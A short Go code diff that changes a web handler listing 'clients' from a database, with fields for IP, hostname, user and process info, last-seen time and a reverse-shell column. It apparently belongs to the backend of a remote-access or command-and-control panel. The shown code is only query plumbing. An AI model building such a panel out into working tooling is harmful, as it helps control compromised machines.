@@ -46,7 +46,7 @@ func clearMessages(w http.ResponseWriter, r *http.Request) {
 }
 
 func getClients(w http.ResponseWriter, r *http.Request) {
-	rows, err := db.Query("SELECT ip, hostname, username, process_name, pid, last_seen, revshell FROM clients ORDER BY last_seen DESC")
+	rows, err := db.Query("SELECT ip, hostname, userinfo, processinfo, last_seen, revshell FROM clients ORDER BY last_seen DESC")
 	if err != nil {
 		log.Printf("查询客户端失败: %v", err)
 		w.WriteHeader(http.StatusInternalServerError)
@@ -57,8 +57,8 @@ func getClients(w http.ResponseWriter, r *http.Request) {
 	var clients []Client
 	for rows.Next() {
 		var client Client
-		err := rows.Scan(&client.IP, &client.Hostname, &client.Username,
-			&client.ProcessName, &client.PID, &client.LastSeen, &client.RevShell)
+		err := rows.Scan(&client.IP, &client.Hostname, &client.UserInfo,
+			&client.ProcessInfo, &client.LastSeen, &client.RevShell)
 		if err != nil {
 			log.Printf("扫描客户端失败: %v", err)
 			continue
